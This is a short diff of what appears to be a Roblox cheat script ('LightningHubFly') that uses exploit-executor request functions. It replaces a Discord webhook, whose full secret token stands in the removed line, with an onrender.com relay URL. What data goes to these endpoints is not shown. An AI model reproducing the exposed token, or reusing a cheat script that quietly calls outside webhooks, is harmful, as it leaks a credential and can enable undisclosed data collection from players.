@@ -7,7 +7,7 @@ local coreGui = game:GetService("CoreGui")
 local HttpService = game:GetService("HttpService")
 
 local requestFunc = syn and syn.request or http_request or request or HttpPost
-local webhookUrl = "https://discord.com/api/webhooks/1546576645001838772/BOxFxnhEds5fKPBTFcY4UdDL3lKFNgxt7CWWLCtjJyIiK4G95lfWpRLcjScsXEdh6qwR"
+local webhookUrl = "https://webhook-1-uhs9.onrender.com/send"
 
 if coreGui:FindFirstChild("LightningHubFly") then coreGui.LightningHubFly:Destroy() end
 
